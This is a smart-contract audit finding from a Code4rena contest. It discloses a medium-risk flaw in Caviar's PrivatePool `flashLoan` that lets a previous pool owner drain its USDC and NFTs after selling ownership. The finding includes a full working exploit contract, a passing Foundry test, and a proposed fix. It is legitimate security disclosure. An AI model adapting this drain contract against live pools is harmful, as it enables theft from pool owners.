## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- downgraded by judge
- high quality report
- primary issue
- selected for report
- sponsor confirmed
- M-15

# [Pool tokens can be stolen via `PrivatePool.flashLoan` function from previous owner](https://github.com/code-423n4/2023-04-caviar-findings/issues/230) 

# Lines of code

https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L461
https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L623-L654


# Vulnerability details

## Impact
`PrivatePool.sol` ERC721 and ERC20 tokens can be stolen by the previous owner via `execute` and `flashLoan` functions (or by malicious approval by the current owner via `execute`)

## Proof of Concept
Let's say that Bob is the attacker and Alice is a regular user.

1.Bob creates a `PrivatePool.sol` where he deposits 5 ERC721 tokens and 500 USDC.
2.Then Bob creates a malicious contract (let's call it `PrivatePoolExploit.sol`) and this contract contains `onFlashLoan` (IERC3156FlashBorrower), `transferFrom` , `ownerOf`, `onERC721Received` functions (like ERC721 does) and an additional `attack` function.
3.Via `PrivatePool.execute` function Bob approves USDC spending (`type(uint).max`) and `setApprovalForAll` for ERC721 tokens
4.Since the ownership of `PrivatePool` is stored in `Factory.sol` as an ERC721 token, ownership can be sold on any ERC721 marketplace. Alice decides to buy Bob's `PrivatePool` and ownership is transferred to Alice.
5.Right after the ownership is transferred, Bob runs `PrivatePoolExploit.attack` function, which calls `PrivatePool.flashLoan` where `PrivatePoolExploit.transferFrom` will be called since the flash loan can be called on any address.
6. All the funds are stolen by Bob and Alice's `PrivatePool` is left with nothing.

### Here is a PoC example:

To run the test:

1.Save `PrivatePoolExploit.sol` under path `src/attacks/PrivatePoolExploit.sol`
2.Save `Attack.t.sol` under path `src/test/PrivatePool/Attack.t.sol`
3.Run the test with the command `forge test --match-contract AttackTest`

PrivatePoolExploit.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ERC20} from "solmate/tokens/ERC20.sol";
import {ERC721} from "solmate/tokens/ERC721.sol";
import {IERC3156FlashBorrower} from "openzeppelin/interfaces/IERC3156FlashBorrower.sol";
import {PrivatePool} from "../PrivatePool.sol";


contract PrivatePoolExploit is IERC3156FlashBorrower {
    PrivatePool private immutable _privatePool;
    ERC20 private immutable _baseToken;
    ERC721 private immutable _nftToken;
    address private immutable _owner;

    uint private transferFromCalled;

    uint[] private tokenIds;

    constructor(PrivatePool _target) {
        _privatePool = _target;
        _baseToken = ERC20(_target.baseToken());
        _nftToken = ERC721(_target.nft());
        _owner = msg.sender;
    }

    function attack(uint[] calldata _tokenIds) external {
        tokenIds = _tokenIds;
        _privatePool.flashLoan(
            this,
            address(this),
            0,
            abi.encode(_tokenIds)
        );
    }


    function safeTransferFrom(
        address,
        address,
        uint256
    ) public {
    }

    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        // Transfer all base tokens to this contract
        _baseToken.transferFrom(address(_privatePool), address(this), _baseToken.balanceOf(address(_privatePool)));

        // Transfer all NFTs to the owner
        for (uint i = 0; i < tokenIds.length; i++) {
            _nftToken.transferFrom(address(_privatePool), _owner, tokenIds[i]);
        }

        // Get the fee that needs to be repaid and approve the amount
        uint256 fee = _privatePool.flashFee(address(0), 0);
        _baseToken.approve(address(_privatePool), fee);

        // Transfer all excess base tokens to the owner
        _baseToken.transfer(_owner, _baseToken.balanceOf(address(this)));

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function ownerOf(uint) public view returns (address) {
        return address(_privatePool);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
```

Attack.t.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../Fixture.sol";
import "../../src/attacks/PrivatePoolExploit.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract ERC20Example is ERC20 {
    constructor(string memory _name, string memory _symbol, uint8 _decimals) ERC20(_name, _symbol, _decimals) {
        _mint(msg.sender, 100_000 * 10**_decimals);
    }
}

contract AttackTest is Fixture {
    event Buy(
        uint256[] tokenIds,
        uint256[] tokenWeights,
        uint256 inputAmount,
        uint256 feeAmount,
        uint256 protocolFeeAmount,
        uint256 royaltyFeeAmount
    );

    address bob = address(0x1);
    address alice = address(0x2);

    PrivatePoolExploit public privatePoolExploit;
    ERC20 public baseToken;

    address nft = address(milady);
    uint128 virtualBaseTokenReserves = 100e6;
    uint128 virtualNftReserves = 5e18;
    uint16 feeRate = 0;
    uint56 changeFee = 0;
    bytes32 merkleRoot = bytes32(0);
    bytes32 salt = bytes32(0);
    uint256 baseTokenAmount = 500e6;
    uint256[] tokenIds;
    uint256[] tokenWeights;
    PrivatePool.MerkleMultiProof proofs;

    function setUp() public {
        vm.startPrank(bob);
        privatePoolImplementation = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));
        baseToken = new ERC20Example("USDC", "USDC", 6);


        for (uint256 i = 0; i < 5; i++) {
            milady.mint(address(bob), i);
            tokenIds.push(i);
        }
    }

    function test_exploit() public {

        // Approve all NFTs and baseToken to the Factory
        baseToken.approve(address(factory), type(uint256).max);
        milady.setApprovalForAll(address(factory), true);


        PrivatePool privatePool = factory.create(
            address(baseToken),
            address(milady),
            virtualBaseTokenReserves,
            virtualNftReserves,
            changeFee,
            feeRate,
            merkleRoot,
            true,
            false,
            salt,
            tokenIds,
            baseTokenAmount
        );

        // First Bob deploys the exploit contract
        privatePoolExploit = new PrivatePoolExploit(privatePool);


        // Then Bob approves the exploit contract to spend PrivatePool's baseToken and NFTs
        privatePool.execute(
            address(baseToken),
            abi.encodeWithSignature("approve(address,uint256)", address(privatePoolExploit), type(uint256).max)
        );

        privatePool.execute(
            address(nft),
            abi.encodeWithSignature("setApprovalForAll(address,bool)", address(privatePoolExploit), true)
        );


        // Bob sells the ownership of the PrivatePool to Alice (as an example just transfering the ownership)
        uint tokenIdOfPrivatePool = uint256(uint160(address(privatePool)));
        factory.transferFrom(bob, alice, tokenIdOfPrivatePool);

        assertEq(factory.ownerOf(tokenIdOfPrivatePool), alice);

        uint balanceBeforeAttack = baseToken.balanceOf(bob);
        uint erc721BalanceBeforeAttack = milady.balanceOf(bob);

        // Bob runs the exploit
        privatePoolExploit.attack(tokenIds);

        uint balanceAfterAttack = baseToken.balanceOf(bob);
        uint erc721BalanceAfterAttack = milady.balanceOf(bob);

        assertEq(balanceAfterAttack, balanceBeforeAttack + baseTokenAmount - changeFee);
        assertEq(erc721BalanceAfterAttack, erc721BalanceBeforeAttack + tokenIds.length);
    }
}
```

Result of the test
```
Running 1 test for test/PrivatePool/Attack.t.sol:AttackTest
[PASS] test_exploit() (gas: 1182634)
Test result: ok. 1 passed; 0 failed; finished in 7.15ms
```

## Tools Used
Foundry/VSCode

## Recommended Mitigation Steps
The contract caller should not be able to choose the token address in the `PrivatePool.flashLoan`
function because there is no way to know if the token contract is actually an ERC721 contract.

Suggest removing `token` from function input parameters and using `nft` token everywhere, where `token` was used.

```solidity
    function flashLoan(IERC3156FlashBorrower receiver, uint256 tokenId, bytes calldata data)
        external
        payable
        returns (bool)
    {
        address nftAddress = nft;
        // check that the NFT is available for a flash loan
        if (!availableForFlashLoan(nftAddress, tokenId)) revert NotAvailableForFlashLoan();

        // calculate the fee
        uint256 fee = flashFee(nftAddress, tokenId);

        // if base token is ETH then check that caller sent enough for the fee
        if (baseToken == address(0) && msg.value < fee) revert InvalidEthAmount();

        // transfer the NFT to the borrower
        ERC721(nftAddress).safeTransferFrom(address(this), address(receiver), tokenId);

        // call the borrower
        bool success =
            receiver.onFlashLoan(msg.sender, nftAddress, tokenId, fee, data) == keccak256("ERC3156FlashBorrower.onFlashLoan");

        // check that flashloan was successful
        if (!success) revert FlashLoanFailed();

        // transfer the NFT from the borrower
        ERC721(nftAddress).safeTransferFrom(address(receiver), address(this), tokenId);

        // transfer the fee from the borrower
        if (baseToken != address(0)) ERC20(baseToken).transferFrom(msg.sender, address(this), fee);

        return success;
    }
```